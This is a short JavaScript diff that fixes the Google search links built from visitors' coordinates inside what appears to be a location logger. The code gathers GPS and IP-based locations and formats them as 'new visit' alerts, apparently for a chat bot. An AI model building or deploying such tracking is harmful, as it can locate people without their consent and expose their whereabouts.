@@ -67,8 +67,8 @@
             const lon = pos.coords.longitude;
             const acc = Math.round(pos.coords.accuracy);
 
-            // CORREGIDO: Se estructuró la dirección de búsqueda completa (con /search?q=) y una coma limpia
-            const rawUrl = "https://google.com" + lat + "," + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "," + lon;
+            // Para el GPS (Línea 64 aproximadamente):
+            const rawUrl = "https://www.google.com/search?q=" + lat + "," + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "," + lon;
             const safeUrl = escapeHTML(rawUrl);
 
             const texto = "<b>📍 Nueva Visita (GPS)</b>\n\n" +
@@ -98,8 +98,8 @@
                 const country = data.country_name || 'Desconocido';
                 const city = data.city || 'Desconocida';
                 
-                // CORREGIDO: Se estructuró la dirección completa en el fallback de IP también
-                const rawUrlIP = "https://google.com" + latIP + "," + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "," + lonIP;
+                // Para la IP (Línea 90 aproximadamente):
+                const rawUrlIP = "https://www.google.com/search?q=" + latIP + "," + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "," + lonIP;
                 const safeUrlIP = escapeHTML(rawUrlIP);
 
                 const textoIP = "<b>🌐 Nueva Visita (Por IP)</b>\n\n" +
